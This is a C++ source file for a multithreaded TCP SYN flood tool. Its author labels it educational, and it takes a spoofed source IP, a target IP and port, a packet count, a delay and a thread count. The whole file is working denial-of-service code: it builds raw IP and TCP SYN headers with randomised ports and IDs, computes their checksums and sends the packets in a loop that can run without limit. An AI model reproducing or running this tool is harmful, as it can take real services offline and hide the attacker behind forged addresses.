/**
 * A TCP synflood tool built for Linux host
 * Created for educational purpose in simulation environment, do NOT use against real targets
 * 
 * Author Theo Martos © 2019, realeased under MIT licence
 * I'm not responsible for the usage that you might have of this tool.
 */

#include "tcp_synflood.hpp"

using namespace std;

// Source and destination IP and destination port for the attack
char SRC_IP[IP_SIZE];
char DST_IP[IP_SIZE];
unsigned short DST_PORT = 80;

int main(int argc, char **argv)
{
    int opt; // To handle args
    unsigned int sleep_time = 10;     // How long to sleep between two SYN packet launchs in ms
    int packet_to_send = -1;          // How many packets has to be sent, below 0 is unlimited
    unsigned short threads_count = 1; // How many threads are going to be used
    vector<thread> threads;

    // Clear IP buffers before writting
    memset(SRC_IP, 0, IP_SIZE);
    memset(DST_IP, 0, IP_SIZE);

    // args handling
    while ((opt = getopt(argc, argv, "s:d:p:n:t:T:")) != EOF)
    {
        switch(opt)
        {
            case 's': { // Source IP
                strcpy(SRC_IP, optarg);
                break;
            }
            case 'd': { // Dest IP
                strcpy(DST_IP, optarg);
                break;
            }
            case 'p': { // Dest port, default is 80
                DST_PORT = atoi(optarg);
                break;
            }
            case 'n': { // How many packet to send
                packet_to_send = atoi(optarg);
                break;
            }
            case 't': { // Time to wait in ms
                sleep_time = atoi(optarg);
                break;
            }
            case 'T': { // How many thread to please you ? Default is 1
                threads_count = atoi(optarg);
                break;
            }
            case '?': {
                printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -n <how many packet to send> -t <time to sleep in ms> -T <how many thread to attack>\n");
            }
        }
    }

    // Both IP address' have to be set
    if(strlen(SRC_IP) > 0 && strlen(DST_IP) > 0)
    {
        printf("Launching attack to %s:%d from %s every %d ms\n with %d thread(s)", DST_IP, DST_PORT, SRC_IP, sleep_time, threads_count);

        // Creating threads
        for(int i = 0; i < threads_count; i++)
        {
            std::thread th(exploit, sleep_time, packet_to_send);
            threads.push_back(move(th));
        }

        // Thread joins here
        for(thread &th : threads)
        {
            if(th.joinable())
                th.join();
        }
    }
    else
        printf("Usage : ./tcp_synflood -s \"source ip\" -d \"destination ip\" -p <port> -n <how many packet to send> -t <time to sleep in ms> -T <how many thread to attack>\n");

    return EXIT_SUCCESS;
}

void exploit(unsigned int time_to_sleep, int packet_to_send)
{
    // Creating the socket and getting the file directory
    SOCKET socket_fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);

    unsigned short th_id = get_rand();

    if (socket_fd == SOCKET_ERROR)
    {
        printf("Socket creation failed.\n");
        exit(-1);
    }
    else
    {
        // Setting up a buffer for the packet and creating headers for IP and TCP
        char packet[PACKET_SIZE];
        IPHDR *ip_header = (IPHDR *)packet;
        TCPHDR *tcp_header = (TCPHDR *)(packet + sizeof(IPHDR));
        TCPOPT *tcp_opt = (TCPOPT *)(packet + sizeof(IPHDR) + sizeof(TCPHDR));
        SOCKADDR_IN sin;

        // Setting up socket options
        const int one = 1;
        if(setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0 &&
           setsockopt(socket_fd, IPPROTO_IP, IP_NODEFRAG, &one, sizeof(one)) < 0)
        {
            printf("Error while setting socket options.\n");
            exit(-2);
        }
        else
        {
            // Setting up the SOCKADDR_IN according to the target
            sin.sin_family = AF_INET;
            sin.sin_port = htons(DST_PORT);
            sin.sin_addr.s_addr = inet_addr(DST_IP);

            // Launching the attack
            unsigned int packet_counter = 0; // If packet_to_send is < 0, unsigned int can never reach this value
            while (packet_counter != packet_to_send)
            {
                memset(packet, 0, PACKET_SIZE); // Clearing the packet buffer
                fill_ip_header(ip_header);      // Filling up the IP header and computing the IP Checksum
                fill_tcp_opt(tcp_opt);          // Filling up the TCP header's options (needs to be done before the TCP checksum)
                fill_tcp_header(tcp_header, tcp_opt); // Filling up the TCP header and computing the TCP Checksum

                // Sending the packet
                if (sendto(socket_fd, packet, ip_header->tot_len, 0, (SOCKADDR *) &sin, sizeof(sin)) < 0)
                {
                    printf("Error while sending packet.\n");
                    exit(-3);
                }
                else
                {
                    // Wait and increment
                    this_thread::sleep_for(chrono::milliseconds(time_to_sleep));
                    packet_counter++;
                }
            }
        }
    }

    close(socket_fd);
}

/* Fill the IP header buffer and compute checksum */
void fill_ip_header(IPHDR *ip_header)
{
    // Randomize the packet ID
    unsigned short packet_id = get_rand();

    // Setting all the informations for an IPv4 packet
    ip_header->version = 4;
    ip_header->ihl = 5;
    ip_header->tos = 0;
    ip_header->tot_len = sizeof(IPHDR) + sizeof(TCPHDR) + sizeof(TCPOPT);
    ip_header->id = htons(packet_id);
    ip_header->frag_off = 0;
    ip_header->ttl = 64;
    ip_header->protocol = IPPROTO_TCP;
    ip_header->check = 0;
    ip_header->saddr = inet_addr(SRC_IP);
    ip_header->daddr = inet_addr(DST_IP);

    // Computing checksum
    ip_header->check = checksum((unsigned short *)ip_header, ip_header->tot_len);
}

/* Fill the TCP header's options buffer */
void fill_tcp_opt(TCPOPT* tcp_opt)
{

    // For an TCP SYN we need MMS and WS to be set, as well as the SACK allowed

    tcp_opt->mms_knd = 2;
    tcp_opt->mms_len = 4;
    tcp_opt->mms_val = htons(1440);
    tcp_opt->nop_1 = 1;
    tcp_opt->ws_knd = 3;
    tcp_opt->ws_len = 3;
    tcp_opt->ws_val = 8;
    tcp_opt->nop_2 = 1;
    tcp_opt->nop_3 = 1;
    tcp_opt->sck_knd = 4;
    tcp_opt->sck_len = 2;
}

/* Fill the TCP header buffer and compute checksum */
void fill_tcp_header(TCPHDR *tcp_header, TCPOPT* tcp_opt)
{
    // Setting all the informations for TCP SYN
    tcp_header->source = htons(get_rand()); // Randomize source port to avoid retransmission-like packet
    tcp_header->dest = htons(DST_PORT);
    tcp_header->seq = 0;
    tcp_header->ack_seq = 0;
    tcp_header->doff = 8;
    tcp_header->fin = 0;
    tcp_header->syn = 1; // SYN flag enabled
    tcp_header->rst = 0;
    tcp_header->psh = 0;
    tcp_header->ack = 0;
    tcp_header->urg = 0;
    tcp_header->window = htons(29200);
    tcp_header->check = 0;
    tcp_header->urg_ptr = 0;

    // Creating the pseudo header to TCP checksum computation
    PSD_HEADER pseudo_header;
    pseudo_header.source_address = inet_addr(SRC_IP);
    pseudo_header.dest_address = inet_addr(DST_IP);
    pseudo_header.placeholder = 0;
    pseudo_header.protocol = IPPROTO_TCP;
    pseudo_header.tcp_length = htons(sizeof(TCPHDR) + sizeof(TCPOPT));

    // Filling up the buffer this all headers/options
    int p_size = sizeof(PSD_HEADER) + sizeof(TCPHDR) + sizeof(TCPOPT);
    char *buffer = (char *)malloc(p_size);
    memcpy(buffer, (char *)&pseudo_header, sizeof(PSD_HEADER));
    memcpy(buffer + sizeof(PSD_HEADER), tcp_header, sizeof(TCPHDR));
    memcpy(buffer + sizeof(PSD_HEADER) + sizeof(TCPHDR), tcp_opt, sizeof(TCPOPT));

    // Computing checksum and cleaning memory up
    tcp_header->check = checksum((unsigned short *)buffer, p_size);
    free(buffer);
    buffer = nullptr;
}

/* Usual checksum algorithm, summing up 16 bits chunk */
unsigned short checksum(unsigned short *buffer, int nb_bytes)
{
    unsigned long check_sum = 0;

    while(nb_bytes > 1)
    {
        check_sum += *buffer++;
        nb_bytes -= sizeof(unsigned short);
    }

    if(nb_bytes == 1)
    {
        check_sum += *(unsigned char *)buffer;
    }

    check_sum = (check_sum >> 16) + (check_sum & 0xffff);
    check_sum += (check_sum >> 16);

    return (unsigned short)(~check_sum);
}

/* Get random numbers from /dev/urandom Linux number generator */
unsigned short get_rand()
{
    unsigned short random_value = 0;
    size_t size = sizeof(random_value);
    ifstream urandom("/dev/urandom", ios::in | ios::binary);
    if(urandom)
    {
        urandom.read(reinterpret_cast<char*>(&random_value), size);
        urandom.close();
    }
    else
    {
        cerr << "Failed to open stream /dev/urandom" << endl;
        random_value = 35789; // A "default" random value, just in case
    }

    return random_value;
}